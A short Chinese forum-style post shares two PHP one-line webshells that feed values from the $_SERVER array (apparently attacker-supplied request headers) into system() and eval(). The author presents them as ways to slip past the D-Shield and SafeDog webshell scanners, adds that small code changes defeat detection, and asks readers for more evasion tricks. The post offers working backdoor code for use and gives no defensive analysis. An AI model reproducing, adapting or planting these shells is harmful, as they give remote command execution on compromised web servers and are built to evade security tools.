前几天某朋友分享了给我两个一句话的样本
但是不知道是谁提交给了D盾,导致被查,不过只要再改改代码还是能轻松绕过D盾的 安全狗那些就更不用说了

<?php
$b="";
$a = array_values($_SERVER);
 
$l=system($b.$a[6]);
echo  $l;
 
 ?>
 
 system参数随便修改,分情况来修改 也可以使用eval
 
 <?php
 
$b = array_values($_SERVER);
$l=eval($b[22]);
echo  $l;
 ?>
 
 抛砖引玉了,期待更多朋友提供奇淫巧计

(再次感谢那位厉害的朋友)
